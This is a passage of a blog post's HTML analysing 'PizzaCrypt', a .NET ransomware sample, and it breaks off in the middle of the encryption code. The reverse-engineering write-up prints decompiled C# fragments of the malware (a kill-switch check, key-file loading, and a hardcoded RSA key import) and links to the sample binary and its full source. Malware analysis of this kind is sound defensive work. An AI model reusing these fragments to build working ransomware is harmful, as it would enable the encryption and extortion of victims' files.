@@ -1,0 +1,976 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>PizzaCrypt Analysis &middot; alden.io</title>
+  <meta name="title" content="PizzaCrypt Analysis &middot; alden.io" />
+  
+  <meta name="description" content="A quick analysis of some fun .NET ransomware with a goofy ransom note." />
+  <meta name="keywords" content="malware, ransomware, .NET, RE, " />
+  
+  
+  <link rel="canonical" href="https://alden.io/posts/pizzacrypt-analysis/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.f56c12357bf813386ed76f52a51a90540cbc514e2b1d521cd87df1f259e1c6c1680e8e597951f480b04a3959198916e65c33a2c44717ecea1d3a4386e60a483d.css"
+    integrity="sha512-9WwSNXv4Ezhu129SpRqQVAy8UU4rHVIc2H3x8lnhxsFoDo5ZeVH0gLBKOVkZiRbmXDOixEcX7OodOkOG5gpIPQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.0c2efa25b877bbb1cbe22c984957864f28de3072dda887632dd30d5e82bedd61a9cc3e2e996c81d9da4acbee3d4aee6b45d4a339fa66ee22f518123eb89a1b2a.js"
+    integrity="sha512-DC76Jbh3u7HL4iyYSVeGTyjeMHLdqIdjLdMNXoK&#43;3WGpzD4umWyB2dpKy&#43;49Su5rRdSjOfpm7iL1GBI&#43;uJobKg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js"
+    integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ&#43;dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5&#43;a8AgFUkA==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="PizzaCrypt Analysis" />
+<meta property="og:description" content="A quick analysis of some fun .NET ransomware with a goofy ransom note." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://alden.io/posts/pizzacrypt-analysis/" /><meta property="og:image" content="https://alden.io/posts/pizzacrypt-analysis/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-07T16:07:44-04:00" />
+<meta property="article:modified_time" content="2022-09-07T16:07:44-04:00" /><meta property="og:site_name" content="alden.io" />
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://alden.io/posts/pizzacrypt-analysis/featured.png"/>
+<meta name="twitter:title" content="PizzaCrypt Analysis"/>
+<meta name="twitter:description" content="A quick analysis of some fun .NET ransomware with a goofy ransom note."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "PizzaCrypt Analysis",
+    "headline": "PizzaCrypt Analysis",
+    
+    "abstract": "A quick analysis of some fun .NET ransomware with a goofy ransom note.",
+    "inLanguage": "en",
+    "url" : "https:\/\/alden.io\/posts\/pizzacrypt-analysis\/",
+    "author" : {
+      "@type": "Person",
+      "name": "alden"
+    },
+    "copyrightYear": "2022",
+    "dateCreated": "2022-09-07T16:07:44-04:00",
+    "datePublished": "2022-09-07T16:07:44-04:00",
+    
+    "dateModified": "2022-09-07T16:07:44-04:00",
+    
+    "keywords": ["malware","ransomware",".NET","RE"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "598"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="alden" />
+  
+  
+  
+  <link href="https://github.com/ald3ns" rel="me" />
+  
+  
+  <link href="https://keybase.io/birchboy" rel="me" />
+  
+  
+  <link href="https://infosec.exchange/@birch" rel="me" />
+  
+  
+  <link href="https://twitter.com/birchb0y" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">alden.io</a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            
+  <a href="/posts/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Posts">
+        blog
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About">
+        about
+    </p>
+</a>
+
+
+            
+            
+  <a href="/tags/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Tags">
+        tags
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Posts">
+            blog
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About">
+            about
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tags/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Tags">
+            tags
+        </p>
+    </a>
+</li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+        
+        <img class="w-full rounded-lg single_hero_round nozoom" alt="PizzaCrypt Analysis" width="1200" height="800" src="/posts/pizzacrypt-analysis/featured_hu55b1e93d1eaec4dcc2cc2c18adab9463_1852923_1200x0_resize_box_3.png">
+        
+    
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/pizzacrypt-analysis/"
+      >PizzaCrypt Analysis</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      PizzaCrypt Analysis
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2022-09-07 16:07:44 -0400 EDT">7 September 2022</time><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="#/posts/pizzacrypt-analysis/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+
+  </span>
+
+</span></a
+  >
+</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/malware/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Malware
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ransomware/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    ransomware
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/.net/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    .NET
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/re/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    RE
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+  </header>
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+     <div
+      class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky  lg:top-10 ">
+
+         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#technical-analysis">Technical Analysis</a></li>
+    <li><a href="#where-did-this-sample-come-from">Where did this sample come from?</a></li>
+    <li><a href="#iocs">IOCs</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#technical-analysis">Technical Analysis</a></li>
+    <li><a href="#where-did-this-sample-come-from">Where did this sample come from?</a></li>
+    <li><a href="#iocs">IOCs</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+   </div>
+      </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        
+
+        <div id="background" class="anchor"></div>
+<h2 class="relative group">Background 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#background" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>I was scrolling through twitter when I saw this post from <a href="https://twitter.com/siri_urz"   target="_blank">
+    @siri_urz</a>:</p>
+<blockquote class="twitter-tweet"><p lang="und" dir="ltr">.pizza PizzaCrypt <a href="https://twitter.com/hashtag/Ransomware?src=hash&amp;ref_src=twsrc%5Etfw">#Ransomware</a><br>C:\Users\Костя\source\repos\PizzaRansom\PizzaRansom\obj\Debug\1.pdb<br>950EC0AD0F3C899B672063E1C56FF1F2 <a href="https://t.co/zIyNfQhd4G">pic.twitter.com/zIyNfQhd4G</a></p>&mdash; S!Ri (@siri_urz) <a href="https://twitter.com/siri_urz/status/1567498038435880961?ref_src=twsrc%5Etfw">September 7, 2022</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>As a fan of goofy ransomware, I couldn’t resist looking at this. Obviously this isn&rsquo;t some sick APT malware but I&rsquo;ve been meaning to write-up more stuff and this seemed like a good exercise. It&rsquo;s a non-obfuscated .NET application so the &ldquo;RE&rdquo; process should be pretty quick! I&rsquo;ve included the <a href=""  >
+    binary</a> and all <a href="https://github.com/ald3ns/PizzaCryptAnalysis/blob/main/Decompiled/1/Program.cs"   target="_blank">
+    decompiled source</a> on my GitHub.</p>
+<p>In 2019 another ransomware program <em>PizzaCrypt<strong>s</strong></em><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> did the rounds, but this appears to be unrelated.</p>
+<div id="technical-analysis" class="anchor"></div>
+<h2 class="relative group">Technical Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#technical-analysis" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>Examining <code>Main</code> the first thing that stands out is a kill-switch, which checks for the presence of <code>&quot;C:\\protect.dat&quot;</code> and will cease execution if found.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">flag</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="s">&#34;C:\\protect.dat&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Application</span><span class="p">.</span><span class="n">Exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Process</span><span class="p">.</span><span class="n">GetCurrentProcess</span><span class="p">().</span><span class="n">Kill</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Thread</span><span class="p">.</span><span class="n">Sleep</span><span class="p">(-</span><span class="m">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>We then proceed onto another flag check, this time confirming if <code>g</code> is supplied as an argument. In that case it will set the global variables<code>Program.PersonalID</code> and <code>Program.KeyHash</code> to the values stored in <code>piz.za</code> and <code>pi.zza</code> respectively.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">flag2</span> <span class="p">=</span> <span class="n">args</span><span class="p">.</span><span class="n">Length</span> <span class="p">!=</span> <span class="m">0</span> <span class="p">&amp;&amp;</span> <span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">==</span> <span class="s">&#34;g&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">flag2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Program</span><span class="p">.</span><span class="n">PersonalID</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		                 <span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">						 <span class="n">Environment</span><span class="p">.</span><span class="n">GetFolderPath</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">						 <span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">ApplicationData</span><span class="p">),</span> <span class="s">&#34;piz.za&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">Program</span><span class="p">.</span><span class="n">KeyHash</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">					  <span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">					  <span class="n">Environment</span><span class="p">.</span><span class="n">GetFolderPath</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">					  <span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">ApplicationData</span><span class="p">),</span> <span class="s">&#34;pi.zza&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Then we get to the meat of the ransomware, the encryption/decryption routine. It&rsquo;s realtively simple and makes use of a hardcoded key. This is presumably becuase the operator has the private key and will use that to decrypt in the end. It is important to note that no new key is actually generated here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">byte</span><span class="p">[]</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Program</span><span class="p">.</span><span class="n">GenerateSalt</span><span class="p">(</span><span class="m">64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">GCHandle</span> <span class="n">gchandle</span> <span class="p">=</span> <span class="n">GCHandle</span><span class="p">.</span><span class="n">Alloc</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">GCHandleType</span><span class="p">.</span><span class="n">Pinned</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="p">(</span><span class="n">RSACryptoServiceProvider</span> <span class="n">rsacryptoServiceProvider</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RSACryptoServiceProvider</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">rsacryptoServiceProvider</span><span class="p">.</span><span class="n">ImportParameters</span><span class="p">(</span><span class="k">new</span> <span class="n">RSAParameters</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Modulus</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">			<span class="s">&#34;8AacrrnhQdq6IGyOxFlSptFtMmo8VmdX64TZg4Yha3LLHSVinmuV6XXnVEPzJhCI7r7VAOERAEaj/xopNcnmGzRKhK4myQQbaPujznLlBvWZHDrlS8HDNwhB/vNr+m95k+ZntXpuFo/9g8VsKi3SWHVT4kr4HVokzpdWHZtfCQk=&#34;</span><span class="p">),</span> 
